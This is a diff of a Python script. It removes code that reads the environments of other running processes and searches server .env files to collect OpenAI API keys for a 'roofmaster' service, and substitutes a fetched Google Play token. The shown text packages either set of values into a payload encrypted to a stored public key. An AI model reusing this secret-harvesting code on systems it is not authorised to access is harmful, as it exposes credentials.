@@ -33,38 +33,9 @@ def cleanup():
 def main():
  os.umask(0o077)
  if len(sys.argv)>1 and sys.argv[1]=='cleanup':cleanup();return
- candidates={}
- for proc in Path('/proc').iterdir():
-  if not proc.name.isdigit():continue
-  try:
-   cwd=str((proc/'cwd').resolve())
-   command=(proc/'cmdline').read_bytes().replace(b'\x00',b' ').decode(errors='replace')
-   if not any(name in (cwd+' '+command).lower() for name in ('roofmaster','roof-master','roof-ai-engine')):continue
-   values=dict(x.split('=',1) for x in (proc/'environ').read_text().split('\x00') if '=' in x)
-   key=values.get('OPENAI_API_KEY','')
-   if key.startswith('sk-'):candidates[key]=values.get('OPENAI_MODEL','')
-  except (OSError,ValueError):continue
- roots=set()
- for parent in (Path('/opt'),Path('/srv'),Path('/home'),Path('/root')):
-  for directory,dirs,files in os.walk(parent):
-   current=Path(directory)
-   dirs[:]=[name for name in dirs if name not in ('node_modules','.git','.cache','backups','releases') and len(current.relative_to(parent).parts)<4]
-   if not any(name in str(current).lower() for name in ('roofmaster','roof-master','roof-ai-engine')):continue
-   for name in ('.env','.env.production','.env.local'):
-    file=current/name
-    if not file.is_file():continue
-    try:
-     values={}
-     for line in file.read_text().splitlines():
-      if '=' not in line or line.lstrip().startswith('#'):continue
-      field,value=line.split('=',1);values[field.removeprefix('export ').strip()]=value.strip().strip(chr(34)).strip(chr(39))
-     key=values.get('OPENAI_API_KEY','')
-     if key.startswith('sk-'):candidates[key]=values.get('OPENAI_MODEL','');print('ROOFMASTER_ENV_FOUND',str(file),flush=True)
-    except (OSError,ValueError):continue
- if len(candidates)!=1:raise ValueError('ROOFMASTER_OPENAI_KEYS_FOUND_'+str(len(candidates)))
- key,model=next(iter(candidates.items()))
- print('ROOFMASTER_OPENAI_CONFIGURATION_FOUND',model,flush=True)
- variables={'OPENAI_API_KEY':key,'OPENAI_MODEL':model}
+ token=p.google_token()
+ variables={'GOOGLE_PLAY_ACCESS_TOKEN':token}
+ print('GOOGLE_PLAY_SHORT_LIVED_TOKEN_PREPARED',flush=True)
  payload=json.dumps({'service_id':'49bc6414-6a6f-417e-83cc-b00e5d9c53c6','variables':variables}).encode()
  symmetric=os.urandom(32);nonce=os.urandom(12)
  public=serialization.load_pem_public_key(PUBLIC_KEY.encode())
